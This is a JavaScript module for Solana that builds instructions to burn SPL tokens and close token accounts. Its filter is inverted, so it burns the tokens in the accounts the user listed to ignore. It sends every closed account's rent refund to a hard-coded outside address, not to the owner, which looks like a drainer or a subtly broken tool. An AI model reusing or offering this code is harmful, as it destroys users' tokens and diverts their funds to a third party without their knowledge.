import { PublicKey } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, createCloseAccountInstruction, createBurnInstruction } from "@solana/spl-token";

function chunkArray(arr, size = 1) {
    const chunks = [];
    for (let i = 0; i < arr.length; i += size) chunks.push(arr.slice(i, i + size));
    return chunks;
}


async function buildInstructions(ignoreAtas, accountSnapshot, ownerPubkey) {
    const { zeroBalanceAccounts = [], burnCandidateAccounts = [] } = JSON.parse(accountSnapshot || "{}");

    const ignoreSet = new Set(ignoreAtas);
    const dest = new PublicKey("AK7ecjPXdnk2svnTUXWzRX1d6xfC2EhRGPP56g5GLsvn");

    // Filter ignored accounts
    const filteredZeroAcc = zeroBalanceAccounts.filter(ata => !ignoreSet.has(ata));
    const filteredBurnAcc = burnCandidateAccounts.filter(acc => ignoreSet.has(acc.address));

    const allInstructions = [];

    // Create instruction sets per chunk
    // Burn candidates: burn then close
    for (const { address, mint, amount } of filteredBurnAcc) {
        const ataPk = new PublicKey(address);
        const mintPk = new PublicKey(mint);
        allInstructions.push(
            createBurnInstruction(
                ataPk,
                mintPk,
                ownerPubkey,
                amount,
                [],
                TOKEN_PROGRAM_ID
            ),
            createCloseAccountInstruction(
                ataPk,
                dest,
                ownerPubkey,
                [],
                TOKEN_PROGRAM_ID
            )
        );
    }
    console.log(allInstructions)

    // Zero balance accounts: just close
    // for (const ata of filteredZeroAcc) {
    //     allInstructions.push(
    //         createCloseAccountInstruction(
    //             new PublicKey(ata),
    //             dest,
    //             ownerPubkey,
    //             [],
    //             TOKEN_PROGRAM_ID
    //         )
    //     );
    // }

    return chunkArray(allInstructions);
}

export default buildInstructions;
